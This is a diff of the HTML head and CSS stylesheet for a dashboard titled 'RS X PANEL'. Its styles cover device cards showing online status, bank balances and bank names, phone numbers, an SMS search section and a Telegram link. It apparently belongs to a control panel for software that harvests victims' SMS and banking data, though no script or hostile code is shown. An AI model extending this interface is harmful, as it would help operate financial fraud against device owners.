@@ -1,1560 +1,1714 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>RS X PANEL</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
-    <style>
-        /* ===== RESET & VARIABLES ===== */
-        * { margin:0; padding:0; box-sizing:border-box; }
-        :root {
-            --bg: #080b12;
-            --bg2: #0d111a;
-            --bg3: #141a26;
-            --bg4: #1c2332;
-            --border: #1f293f;
-            --border2: #2c3852;
-            --text: #eef2f8;
-            --muted: #8892a8;
-            --dim: #3d4a60;
-            --red: #ff3027;
-            --green: #00d68f;
-            --cyan: #18bfff;
-            --gold: #f6cf45;
-            --shadow: 0 18px 60px rgba(0,0,0,0.7);
-            --radius: 14px;
-            --font: 'Inter', system-ui, sans-serif;
-        }
-        html, body { height:100%; background:var(--bg); color:var(--text); font-family:var(--font); -webkit-font-smoothing:antialiased; }
-        ::-webkit-scrollbar { width:4px; height:4px; }
-        ::-webkit-scrollbar-track { background:var(--bg2); }
-        ::-webkit-scrollbar-thumb { background:var(--dim); border-radius:4px; }
-        button { cursor:pointer; font-family:inherit; }
-        input, textarea { font-family:inherit; outline:none; }
-        a { color:inherit; text-decoration:none; }
-        .hidden { display:none !important; }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>RS X PANEL</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+:root {
+    --bg: #080b12; --bg2: #0d111a; --bg3: #141a26; --bg4: #1c2332;
+    --border: #1f293f; --border2: #2c3852; --text: #eef2f8;
+    --muted: #8892a8; --dim: #3d4a60; --red: #ff3027;
+    --green: #00d68f; --cyan: #18bfff; --gold: #f6cf45;
+    --shadow: 0 18px 60px rgba(0,0,0,0.7); --radius: 14px;
+    --font: 'Inter', system-ui, sans-serif;
+}
+html, body { height:100%; background:var(--bg); color:var(--text); font-family:var(--font); -webkit-font-smoothing:antialiased; }
+::-webkit-scrollbar { width:4px; height:4px; }
+::-webkit-scrollbar-track { background:var(--bg2); }
+::-webkit-scrollbar-thumb { background:var(--dim); border-radius:4px; }
+button { cursor:pointer; font-family:inherit; }
+input, textarea { font-family:inherit; outline:none; }
+a { color:inherit; text-decoration:none; }
+.hidden { display:none !important; }
 
-        .toast {
-            position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(20px);
-            background:var(--bg3); border:1px solid var(--border2); padding:12px 28px;
-            border-radius:16px; color:var(--text); font-size:13px; font-weight:600;
-            z-index:99999; box-shadow:var(--shadow); backdrop-filter:blur(12px);
-            opacity:0; transition:all 0.3s cubic-bezier(0.34,1.56,0.64,1); pointer-events:none; white-space:nowrap;
-        }
-        .toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
-        .toast.error { border-color:rgba(255,77,77,0.3); color:var(--red); }
-        .toast.success { border-color:rgba(0,214,143,0.25); color:var(--green); }
+body { transition: zoom 0.2s ease; }
+.zoom-controls { display:flex; gap:4px; margin-left:8px; }
+.zoom-btn {
+    width:28px; height:28px; border-radius:6px; background:var(--bg3);
+    border:1px solid var(--border); color:var(--muted); font-size:13px;
+    display:grid; place-items:center; font-weight:700; transition:0.15s;
+}
+.zoom-btn:hover { color:var(--text); border-color:var(--border2); background:var(--bg4); }
 
-        .screen { min-height:100vh; display:grid; place-items:center; padding:24px; }
-        .shell { width:min(100%,560px); }
-        .brand { text-align:center; }
-        .brand .logo {
-            width:72px; height:72px; border-radius:20px;
-            background:linear-gradient(145deg,#ff3027,#c62913);
-            display:grid; place-items:center; margin:0 auto 20px;
-            box-shadow:0 0 40px rgba(255,48,39,0.3);
-        }
-        .brand .logo svg { width:36px; height:36px; fill:none; stroke:#fff; stroke-width:2.5; }
-        .brand h1 { font-size:38px; font-weight:900; letter-spacing:-1px; }
-        .brand h1 span { color:var(--red); }
-        .brand p { color:var(--muted); margin-top:6px; font-size:15px; }
+.toast {
+    position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(20px);
+    background:var(--bg3); border:1px solid var(--border2); padding:12px 28px;
+    border-radius:16px; color:var(--text); font-size:13px; font-weight:600;
+    z-index:99999; box-shadow:var(--shadow); backdrop-filter:blur(12px);
+    opacity:0; transition:all 0.3s cubic-bezier(0.34,1.56,0.64,1); pointer-events:none; white-space:nowrap;
+}
+.toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+.toast.error { border-color:rgba(255,77,77,0.3); color:var(--red); }
+.toast.success { border-color:rgba(0,214,143,0.25); color:var(--green); }
 
-        .card {
-            background:rgba(13,17,26,0.94); border:1px solid var(--border);
-            border-radius:24px; box-shadow:var(--shadow); backdrop-filter:blur(16px);
-            padding:28px; margin-top:30px;
-        }
-        .card-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
-        .card-header h3 { font-weight:700; font-size:16px; }
-        .card-header .badge { background:var(--bg3); color:var(--muted); padding:6px 14px; border-radius:999px; font-size:12px; }
+.screen { min-height:100vh; display:grid; place-items:center; padding:24px; }
+.shell { width:min(100%,560px); }
+.brand { text-align:center; }
+.brand .logo {
+    width:72px; height:72px; border-radius:20px;
+    background:linear-gradient(145deg,#ff3027,#c62913);
+    display:grid; place-items:center; margin:0 auto 20px;
+    box-shadow:0 0 40px rgba(255,48,39,0.3);
+}
+.brand .logo svg { width:36px; height:36px; fill:none; stroke:#fff; stroke-width:2.5; }
+.brand h1 { font-size:38px; font-weight:900; letter-spacing:-1px; }
+.brand h1 span { color:var(--red); }
+.brand p { color:var(--muted); margin-top:6px; font-size:15px; }
 
-        .conn-item {
-            display:flex; align-items:center; gap:12px; padding:14px 16px;
-            background:var(--bg2); border:1px solid var(--border); border-radius:16px; margin-bottom:10px;
-        }
-        .conn-item .info { flex:1; min-width:0; }
-        .conn-item .info .name { font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:var(--cyan); font-size:13px; }
-        .conn-item .info .date { color:var(--muted); font-size:11px; margin-top:2px; }
-        .conn-item button {
-            width:34px; height:34px; border-radius:50%; border:1px solid var(--border2);
-            background:var(--bg3); color:#aaa; display:grid; place-items:center; font-size:16px; transition:0.15s; flex-shrink:0;
-        }
-        .conn-item button:hover { border-color:var(--muted); }
-        .conn-item .connect { color:var(--green); border-color:rgba(0,214,143,0.25); }
-        .conn-item .connect:hover { border-color:var(--green); background:rgba(0,214,143,0.08); }
-        .conn-item .del { color:var(--red); border-color:rgba(255,77,77,0.2); }
-        .conn-item .del:hover { border-color:var(--red); background:rgba(255,77,77,0.08); }
-        .conn-item .copy-link { color:var(--gold); border-color:rgba(246,207,69,0.2); font-size:14px; }
-        .conn-item .copy-link:hover { border-color:var(--gold); background:rgba(246,207,69,0.08); }
+.card {
+    background:rgba(13,17,26,0.94); border:1px solid var(--border);
+    border-radius:24px; box-shadow:var(--shadow); backdrop-filter:blur(16px);
+    padding:28px; margin-top:30px;
+}
+.card-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
+.card-header h3 { font-weight:700; font-size:16px; }
+.card-header .badge { background:var(--bg3); color:var(--muted); padding:6px 14px; border-radius:999px; font-size:12px; }
 
-        .btn-new {
-            width:100%; padding:14px; border:1px dashed var(--border2); border-radius:16px;
-            background:transparent; color:var(--muted); margin-top:16px; font-size:14px; transition:0.2s;
-        }
-        .btn-new:hover { border-color:var(--muted); color:var(--text); }
+.conn-item {
+    display:flex; align-items:center; gap:12px; padding:14px 16px;
+    background:var(--bg2); border:1px solid var(--border); border-radius:16px; margin-bottom:10px;
+}
+.conn-item .info { flex:1; min-width:0; }
+.conn-item .info .name { font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:var(--cyan); font-size:13px; }
+.conn-item .info .date { color:var(--muted); font-size:11px; margin-top:2px; }
+.conn-item button {
+    width:34px; height:34px; border-radius:50%; border:1px solid var(--border2);
+    background:var(--bg3); color:#aaa; display:grid; place-items:center; font-size:16px; transition:0.15s; flex-shrink:0;
+}
+.conn-item button:hover { border-color:var(--muted); }
+.conn-item .connect { color:var(--green); border-color:rgba(0,214,143,0.25); }
+.conn-item .connect:hover { border-color:var(--green); background:rgba(0,214,143,0.08); }
+.conn-item .del { color:var(--red); border-color:rgba(255,77,77,0.2); }
+.conn-item .del:hover { border-color:var(--red); background:rgba(255,77,77,0.08); }
+.conn-item .copy-link { color:var(--gold); border-color:rgba(246,207,69,0.2); font-size:14px; }
+.conn-item .copy-link:hover { border-color:var(--gold); background:rgba(246,207,69,0.08); }
 
-        .footer-text { text-align:center; color:var(--dim); font-size:12px; margin-top:30px; letter-spacing:0.5px; }
+.btn-new {
+    width:100%; padding:14px; border:1px dashed var(--border2); border-radius:16px;
+    background:transparent; color:var(--muted); margin-top:16px; font-size:14px; transition:0.2s;
+}
+.btn-new:hover { border-color:var(--muted); color:var(--text); }
 
-        .modal-overlay {
-            position:fixed; inset:0; background:rgba(0,0,0,0.88); backdrop-filter:blur(12px);
-            z-index:9999; padding:20px; overflow-y:auto; display:none;
-        }
-        .modal-overlay.active { display:block; }
-        .modal-box {
-            max-width:900px; margin:20px auto; background:var(--bg2);
-            border:1px solid var(--border2); border-radius:24px; padding:28px;
-            animation:modalIn 0.2s ease;
-        }
-        @keyframes modalIn { from { opacity:0; transform:scale(0.96) translateY(12px); } to { opacity:1; transform:scale(1) translateY(0); } }
-        .modal-header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); padding-bottom:16px; margin-bottom:20px; }
-        .modal-header h2 { font-size:20px; font-weight:800; }
-        .modal-header .close { background:none; border:0; color:var(--muted); font-size:28px; cursor:pointer; padding:0 4px; }
-        .modal-header .close:hover { color:var(--red); }
+.footer-text { text-align:center; color:var(--dim); font-size:12px; margin-top:30px; letter-spacing:0.5px; }
 
-        .form-group { margin-bottom:18px; }
-        .form-group label { display:block; color:var(--muted); font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:6px; }
-        .form-group input, .form-group textarea {
-            width:100%; padding:12px 16px; border:1px solid var(--border); border-radius:14px;
-            background:var(--bg3); color:var(--text); font-size:14px; transition:0.2s;
-        }
-        .form-group input:focus, .form-group textarea:focus { border-color:var(--cyan); box-shadow:0 0 0 3px rgba(24,191,255,0.08); }
-        .form-group textarea { resize:vertical; min-height:80px; }
-        .form-actions { display:flex; gap:12px; margin-top:24px; }
-        .form-actions .primary {
-            flex:1; border:0; border-radius:14px; padding:15px; font-weight:700;
-            background:linear-gradient(90deg,#ff3027,#df3a08); color:#fff;
-            box-shadow:0 8px 25px rgba(255,49,30,0.18); font-size:14px;
-        }
-        .form-actions .primary:hover { transform:translateY(-2px); box-shadow:0 12px 35px rgba(255,49,30,0.3); }
-        .form-actions .secondary {
-            border:0; border-radius:14px; padding:15px 20px; background:var(--bg3);
-            color:var(--muted); font-size:14px; font-weight:600;
-        }
-        .form-actions .secondary:hover { color:var(--text); }
-        .error-text { color:var(--red); text-align:center; font-size:13px; margin-top:14px; }
-        .file-upload {
-            border:1px dashed var(--border2); border-radius:14px; padding:20px; text-align:center;
-            color:var(--muted); cursor:pointer; transition:0.2s;
-        }
-        .file-upload:hover { border-color:var(--muted); color:var(--text); }
-        .file-upload input[type="file"] { display:none; }
+.modal-overlay {
+    position:fixed; inset:0; background:rgba(0,0,0,0.88); backdrop-filter:blur(12px);
+    z-index:9999; padding:20px; overflow-y:auto; display:none;
+}
+.modal-overlay.active { display:block; }
+.modal-box {
+    max-width:900px; margin:20px auto; background:var(--bg2);
+    border:1px solid var(--border2); border-radius:24px; padding:28px;
+    animation:modalIn 0.2s ease;
+}
+@keyframes modalIn { from { opacity:0; transform:scale(0.96) translateY(12px); } to { opacity:1; transform:scale(1) translateY(0); } }
+.modal-header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border); padding-bottom:16px; margin-bottom:20px; }
+.modal-header h2 { font-size:20px; font-weight:800; }
+.modal-header .close { background:none; border:0; color:var(--muted); font-size:28px; cursor:pointer; padding:0 4px; }
+.modal-header .close:hover { color:var(--red); }
 
-        .dashboard { display:none; min-height:100vh; }
-        .topbar {
-            height:68px; border-bottom:1px solid var(--border); background:rgba(8,11,18,0.94);
-            backdrop-filter:blur(12px); display:flex; align-items:center; gap:18px;
-            padding:0 24px; position:sticky; top:0; z-index:50;
-        }
-        .topbar .logo { display:flex; align-items:center; gap:10px; font-weight:800; font-size:16px; letter-spacing:1px; white-space:nowrap; }
-        .topbar .logo .dot {
-            width:32px; height:32px; border-radius:8px; background:linear-gradient(145deg,#ff3027,#c62913);
-            display:grid; place-items:center; box-shadow:0 0 18px rgba(255,48,39,0.25);
-            font-size:12px; color:#fff; font-weight:900;
-        }
-        .topbar .search { flex:1; max-width:400px; }
-        .topbar .search input { height:40px; border-radius:12px; border:1px solid var(--border); background:var(--bg2); color:var(--text); padding:0 14px; width:100%; font-size:13px; }
-        .topbar .search input:focus { border-color:var(--cyan); }
-        .topbar .actions { display:flex; align-items:center; gap:10px; margin-left:auto; }
-        .topbar .actions .status { padding:6px 14px; border:1px solid rgba(0,214,143,0.2); border-radius:999px; color:var(--green); background:rgba(0,214,143,0.06); font-size:12px; font-weight:700; white-space:nowrap; }
-        .topbar .actions .clock { color:var(--muted); font-size:13px; font-weight:500; white-space:nowrap; min-width:70px; text-align:center; }
-        .topbar .actions .telegram {
-            width:38px; height:38px; border-radius:50%; background:rgba(24,191,255,0.06);
-            border:1px solid rgba(24,191,255,0.15); display:grid; place-items:center; transition:0.2s;
-        }
-        .topbar .actions .telegram:hover { background:rgba(24,191,255,0.12); border-color:rgba(24,191,255,0.3); }
-        .topbar .actions .telegram svg { width:20px; fill:#25bdf4; }
-        .topbar .actions .logout { background:var(--bg2); border:1px solid var(--border); color:var(--muted); border-radius:10px; padding:8px 14px; font-size:12px; font-weight:600; }
-        .topbar .actions .logout:hover { border-color:var(--red); color:var(--red); }
+.form-group { margin-bottom:18px; }
+.form-group label { display:block; color:var(--muted); font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:6px; }
+.form-group input, .form-group textarea {
+    width:100%; padding:12px 16px; border:1px solid var(--border); border-radius:14px;
+    background:var(--bg3); color:var(--text); font-size:14px; transition:0.2s;
+}
+.form-group input:focus, .form-group textarea:focus { border-color:var(--cyan); box-shadow:0 0 0 3px rgba(24,191,255,0.08); }
+.form-group textarea { resize:vertical; min-height:80px; }
+.form-actions { display:flex; gap:12px; margin-top:24px; }
+.form-actions .primary {
+    flex:1; border:0; border-radius:14px; padding:15px; font-weight:700;
+    background:linear-gradient(90deg,#ff3027,#df3a08); color:#fff;
+    box-shadow:0 8px 25px rgba(255,49,30,0.18); font-size:14px;
+}
+.form-actions .primary:hover { transform:translateY(-2px); box-shadow:0 12px 35px rgba(255,49,30,0.3); }
+.form-actions .secondary {
+    border:0; border-radius:14px; padding:15px 20px; background:var(--bg3);
+    color:var(--muted); font-size:14px; font-weight:600;
+}
+.form-actions .secondary:hover { color:var(--text); }
+.error-text { color:var(--red); text-align:center; font-size:13px; margin-top:14px; }
+.file-upload {
+    border:1px dashed var(--border2); border-radius:14px; padding:20px; text-align:center;
+    color:var(--muted); cursor:pointer; transition:0.2s;
+}
+.file-upload:hover { border-color:var(--muted); color:var(--text); }
+.file-upload input[type="file"] { display:none; }
 
-        .statsbar { display:flex; gap:28px; padding:16px 26px; border-bottom:1px solid var(--border); overflow-x:auto; background:var(--bg); }
-        .stat-item { min-width:60px; }
-        .stat-item small { display:block; color:var(--dim); font-size:10px; font-weight:800; letter-spacing:0.08em; text-transform:uppercase; }
-        .stat-item strong { display:block; margin-top:4px; font-size:22px; font-weight:800; }
-        .stat-item .green { color:var(--green); }
-        .stat-item .red { color:var(--red); }
-        .stat-item .cyan { color:var(--cyan); }
-        .stat-item .gold { color:var(--gold); }
+.dashboard { display:none; min-height:100vh; }
+.topbar {
+    height:68px; border-bottom:1px solid var(--border); background:rgba(8,11,18,0.94);
+    backdrop-filter:blur(12px); display:flex; align-items:center; gap:14px;
+    padding:0 24px; position:sticky; top:0; z-index:50;
+}
+.topbar .logo { display:flex; align-items:center; gap:10px; font-weight:800; font-size:16px; letter-spacing:1px; white-space:nowrap; }
+.topbar .logo .dot {
+    width:32px; height:32px; border-radius:8px; background:linear-gradient(145deg,#ff3027,#c62913);
+    display:grid; place-items:center; box-shadow:0 0 18px rgba(255,48,39,0.25);
+    font-size:12px; color:#fff; font-weight:900;
+}
+.topbar .search { flex:1; max-width:400px; }
+.topbar .search input { height:40px; border-radius:12px; border:1px solid var(--border); background:var(--bg2); color:var(--text); padding:0 14px; width:100%; font-size:13px; }
+.topbar .search input:focus { border-color:var(--cyan); }
+.topbar .actions { display:flex; align-items:center; gap:10px; margin-left:auto; }
+.topbar .actions .status { padding:6px 14px; border:1px solid rgba(0,214,143,0.2); border-radius:999px; color:var(--green); background:rgba(0,214,143,0.06); font-size:12px; font-weight:700; white-space:nowrap; }
+.topbar .actions .clock { color:var(--muted); font-size:13px; font-weight:500; white-space:nowrap; min-width:70px; text-align:center; }
+.topbar .actions .telegram {
+    width:38px; height:38px; border-radius:50%; background:rgba(24,191,255,0.06);
+    border:1px solid rgba(24,191,255,0.15); display:grid; place-items:center; transition:0.2s;
+}
+.topbar .actions .telegram:hover { background:rgba(24,191,255,0.12); border-color:rgba(24,191,255,0.3); }
+.topbar .actions .telegram svg { width:20px; fill:#25bdf4; }
+.topbar .actions .logout { background:var(--bg2); border:1px solid var(--border); color:var(--muted); border-radius:10px; padding:8px 14px; font-size:12px; font-weight:600; }
+.topbar .actions .logout:hover { border-color:var(--red); color:var(--red); }
 
-        .filters { display:flex; gap:6px; align-items:center; padding:10px 26px; overflow-x:auto; border-bottom:1px solid var(--border); background:var(--bg); }
-        .filters .filter { background:transparent; border:0; color:var(--muted); padding:6px 14px; border-radius:10px; font-size:12px; font-weight:600; white-space:nowrap; transition:0.15s; }
-        .filters .filter:hover { color:var(--text); }
-        .filters .filter.active { background:rgba(255,48,39,0.12); color:var(--red); border:1px solid rgba(255,48,39,0.2); }
-        .filters .sort { margin-left:auto; background:var(--bg2); border:1px solid var(--border); color:var(--muted); padding:6px 14px; border-radius:10px; font-size:12px; font-weight:600; }
-        .filters .sort:hover { border-color:var(--border2); color:var(--text); }
+.statsbar { display:flex; gap:28px; padding:16px 26px; border-bottom:1px solid var(--border); overflow-x:auto; background:var(--bg); }
+.stat-item { min-width:60px; }
+.stat-item small { display:block; color:var(--dim); font-size:10px; font-weight:800; letter-spacing:0.08em; text-transform:uppercase; }
+.stat-item strong { display:block; margin-top:4px; font-size:22px; font-weight:800; }
+.stat-item .green { color:var(--green); }
+.stat-item .red { color:var(--red); }
+.stat-item .cyan { color:var(--cyan); }
+.stat-item .gold { color:var(--gold); }
 
-        .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(280px,1fr)); gap:16px; padding:16px 26px 30px; }
+.filters { display:flex; gap:6px; align-items:center; padding:10px 26px; overflow-x:auto; border-bottom:1px solid var(--border); background:var(--bg); }
+.filters .filter { background:transparent; border:0; color:var(--muted); padding:6px 14px; border-radius:10px; font-size:12px; font-weight:600; white-space:nowrap; transition:0.15s; }
+.filters .filter:hover { color:var(--text); }
+.filters .filter.active { background:rgba(255,48,39,0.12); color:var(--red); border:1px solid rgba(255,48,39,0.2); }
+.filters .sort { background:var(--bg2); border:1px solid var(--border); color:var(--muted); padding:6px 14px; border-radius:10px; font-size:12px; font-weight:600; }
+.filters .sort:hover { border-color:var(--border2); color:var(--text); }
+.filters .refresh-btn {
+    width:32px; height:32px; border-radius:8px; background:var(--bg2); border:1px solid var(--border);
+    color:var(--muted); display:grid; place-items:center; font-size:14px; transition:0.15s;
+}
+.filters .refresh-btn:hover { border-color:var(--border2); color:var(--text); }
 
-        .device-card {
-            background:var(--bg2); border:1px solid var(--border); border-radius:16px;
-            padding:18px; cursor:pointer; transition:0.15s ease; min-height:200px; position:relative;
-        }
-        .device-card:hover { border-color:var(--border2); transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,0,0,0.3); }
-        .device-card .top { display:flex; gap:12px; align-items:flex-start; }
-        .device-card .icon {
-            width:42px; height:42px; border-radius:12px; border:1px solid var(--border);
-            background:var(--bg3); display:grid; place-items:center; font-size:18px; color:var(--muted); flex-shrink:0;
-        }
-        .device-card .icon.online { color:var(--green); border-color:rgba(0,214,143,0.25); background:rgba(0,214,143,0.06); box-shadow:0 0 18px rgba(0,214,143,0.06); }
-        .device-card .info { flex:1; min-width:0; }
-        .device-card .info .name { font-weight:700; font-size:14px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .device-card .info .sub { font-size:11px; color:var(--muted); margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .device-card .info .sub span { margin-right:8px; }
-        .device-card .status-badge { display:inline-block; padding:2px 10px; border-radius:999px; font-size:10px; font-weight:700; margin-top:4px; }
-        .device-card .status-badge.online { background:rgba(0,214,143,0.12); color:var(--green); border:1px solid rgba(0,214,143,0.2); }
-        .device-card .status-badge.offline { background:rgba(255,77,77,0.08); color:var(--red); border:1px solid rgba(255,77,77,0.15); }
-        .device-card .balance-info {
-            margin-top:12px; padding:8px 12px; background:rgba(0,214,143,0.06);
-            border:1px solid rgba(0,214,143,0.12); border-radius:8px;
-            font-size:14px; font-weight:700; color:var(--green);
-            display:flex; justify-content:space-between; align-items:center;
-        }
-        .device-card .balance-info .label { font-weight:400; color:var(--muted); font-size:11px; }
-        .device-card .balance-info .bank-name { color:var(--gold); font-weight:600; font-size:12px; margin-left:8px; }
-        .device-card .details {
-            display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:12px;
-        }
-        .device-card .details .item small { display:block; color:var(--dim); font-size:9px; font-weight:800; letter-spacing:0.06em; text-transform:uppercase; }
-        .device-card .details .item div { margin-top:2px; color:var(--text); font-size:12px; font-weight:500; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-        .device-card .phone-display { margin-top:8px; padding:4px 10px; background:rgba(24,191,255,0.06); border:1px solid rgba(24,191,255,0.1); border-radius:6px; font-size:12px; color:var(--cyan); display:inline-block; }
-        .empty-grid { grid-column:1/-1; text-align:center; color:var(--muted); padding:70px 0; font-size:14px; }
-        .send-btn-small { position:absolute; top:12px; right:12px; background:rgba(24,191,255,0.08); border:1px solid rgba(24,191,255,0.15); border-radius:8px; color:var(--cyan); padding:4px 10px; font-size:14px; cursor:pointer; transition:0.15s; opacity:0.5; z-index:2; }
-        .send-btn-small:hover { opacity:1; background:rgba(24,191,255,0.15); }
+.grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(280px,1fr)); gap:16px; padding:16px 26px 30px; }
 
-        .detail-tabs { display:flex; gap:2px; margin-bottom:20px; border-bottom:1px solid var(--border); padding-bottom:2px; flex-wrap:wrap; }
-        .detail-tabs .tab-btn { background:transparent; border:0; color:var(--muted); padding:10px 18px; font-weight:600; font-size:13px; border-radius:10px 10px 0 0; transition:0.15s; position:relative; }
-        .detail-tabs .tab-btn:hover { color:var(--text); background:var(--bg3); }
-        .detail-tabs .tab-btn.active { color:var(--red); background:var(--bg3); }
-        .detail-tabs .tab-btn .badge { background:rgba(255,255,255,0.06); padding:2px 8px; border-radius:999px; font-size:10px; margin-left:6px; }
-        .detail-tabs .tab-btn.active .badge { background:rgba(255,48,39,0.15); color:var(--red); }
-        .tab-content { display:none; }
-        .tab-content.active { display:block; }
+.device-card {
+    background:var(--bg2); border:1px solid var(--border); border-radius:16px;
+    padding:18px; cursor:pointer; transition:0.15s ease; min-height:200px; position:relative;
+}
+.device-card:hover { border-color:var(--border2); transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,0,0,0.3); }
+.device-card .top { display:flex; gap:12px; align-items:flex-start; }
+.device-card .icon {
+    width:42px; height:42px; border-radius:12px; border:1px solid var(--border);
+    background:var(--bg3); display:grid; place-items:center; font-size:18px; color:var(--muted); flex-shrink:0;
+}
+.device-card .icon.online { color:var(--green); border-color:rgba(0,214,143,0.25); background:rgba(0,214,143,0.06); box-shadow:0 0 18px rgba(0,214,143,0.06); }
+.device-card .info { flex:1; min-width:0; }
+.device-card .info .name { font-weight:700; font-size:14px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+.device-card .info .sub { font-size:11px; color:var(--muted); margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+.device-card .info .sub span { margin-right:8px; }
+.device-card .status-badge { display:inline-block; padding:2px 10px; border-radius:999px; font-size:10px; font-weight:700; margin-top:4px; }
+.device-card .status-badge.online { background:rgba(0,214,143,0.12); color:var(--green); border:1px solid rgba(0,214,143,0.2); }
+.device-card .status-badge.offline { background:rgba(255,77,77,0.08); color:var(--red); border:1px solid rgba(255,77,77,0.15); }
+.device-card .balance-info {
+    margin-top:12px; padding:8px 12px; background:rgba(0,214,143,0.06);
+    border:1px solid rgba(0,214,143,0.12); border-radius:8px;
+    font-size:14px; font-weight:700; color:var(--green);
+    display:flex; justify-content:space-between; align-items:center;
+}
+.device-card .balance-info .label { font-weight:400; color:var(--muted); font-size:11px; }
+.device-card .balance-info .bank-name { color:var(--gold); font-weight:600; font-size:12px; margin-left:8px; }
+.device-card .details {
+    display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:12px;
+}
+.device-card .details .item small { display:block; color:var(--dim); font-size:9px; font-weight:800; letter-spacing:0.06em; text-transform:uppercase; }
+.device-card .details .item div { margin-top:2px; color:var(--text); font-size:12px; font-weight:500; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+.device-card .phone-display { margin-top:8px; padding:4px 10px; background:rgba(24,191,255,0.06); border:1px solid rgba(24,191,255,0.1); border-radius:6px; font-size:12px; color:var(--cyan); display:inline-block; }
+.empty-grid { grid-column:1/-1; text-align:center; color:var(--muted); padding:70px 0; font-size:14px; }
+.send-btn-small { position:absolute; top:12px; right:12px; background:rgba(24,191,255,0.08); border:1px solid rgba(24,191,255,0.15); border-radius:8px; color:var(--cyan); padding:4px 10px; font-size:14px; cursor:pointer; transition:0.15s; opacity:0.5; z-index:2; }
+.send-btn-small:hover { opacity:1; background:rgba(24,191,255,0.15); }
 
-        .detail-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-bottom:16px; }
-        .detail-item { padding:14px 16px; background:var(--bg3); border-radius:12px; border:1px solid var(--border); }
-        .detail-item .label { color:var(--dim); font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:0.06em; margin-bottom:4px; }
-        .detail-item .value { color:var(--text); font-size:15px; font-weight:600; word-break:break-word; }
+/* EMPTY STATE */
+.empty-state {
+    grid-column:1/-1; display:flex; flex-direction:column; align-items:center;
+    justify-content:center; padding:100px 20px; text-align:center;
+}
+.empty-state .shield-icon {
+    width:80px; height:80px; border-radius:24px; background:var(--bg3);
+    border:1px solid var(--border); display:grid; place-items:center;
+    font-size:36px; margin-bottom:24px; color:var(--dim);
+}
+.empty-state h3 { font-size:22px; font-weight:800; margin-bottom:8px; }
+.empty-state p { color:var(--muted); font-size:14px; margin-bottom:24px; }
+.empty-state .auto-refresh-pill {
+    display:flex; align-items:center; gap:8px; padding:10px 18px;
+    background:var(--bg3); border:1px solid var(--border); border-radius:999px;
+    color:var(--muted); font-size:13px; font-weight:500;
+}
+.empty-state .auto-refresh-pill .pulse-dot {
+    width:8px; height:8px; border-radius:50%; background:var(--red);
+    animation:pulseDot 2s infinite;
+}
+@keyframes pulseDot {
+    0% { opacity:1; box-shadow:0 0 0 0 rgba(255,48,39,0.4); }
+    70% { opacity:1; box-shadow:0 0 0 6px rgba(255,48,39,0); }
+    100% { opacity:1; box-shadow:0 0 0 0 rgba(255,48,39,0); }
+}
 
-        .bank-summary { background:var(--bg3); border:1px solid var(--border); border-radius:12px; padding:16px; margin-bottom:16px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; }
-        .bank-summary .balance { font-size:24px; font-weight:900; color:var(--green); }
-        .bank-summary .label { color:var(--muted); font-size:11px; text-transform:uppercase; }
-        .bank-summary .bank-name { color:var(--gold); font-weight:700; font-size:14px; }
+.detail-tabs { display:flex; gap:2px; margin-bottom:20px; border-bottom:1px solid var(--border); padding-bottom:2px; flex-wrap:wrap; }
+.detail-tabs .tab-btn { background:transparent; border:0; color:var(--muted); padding:10px 18px; font-weight:600; font-size:13px; border-radius:10px 10px 0 0; transition:0.15s; position:relative; }
+.detail-tabs .tab-btn:hover { color:var(--text); background:var(--bg3); }
+.detail-tabs .tab-btn.active { color:var(--red); background:var(--bg3); }
+.detail-tabs .tab-btn .badge { background:rgba(255,255,255,0.06); padding:2px 8px; border-radius:999px; font-size:10px; margin-left:6px; }
+.detail-tabs .tab-btn.active .badge { background:rgba(255,48,39,0.15); color:var(--red); }
+.tab-content { display:none; }
+.tab-content.active { display:block; }
 
-        .sms-section h3 { color:var(--muted); font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:12px; display:flex; gap:16px; align-items:center; }
-        .sms-section h3 .count { color:var(--dim); font-weight:400; font-size:11px; }
-        .sms-section .sms-search { margin-bottom:12px; display:flex; gap:8px; }
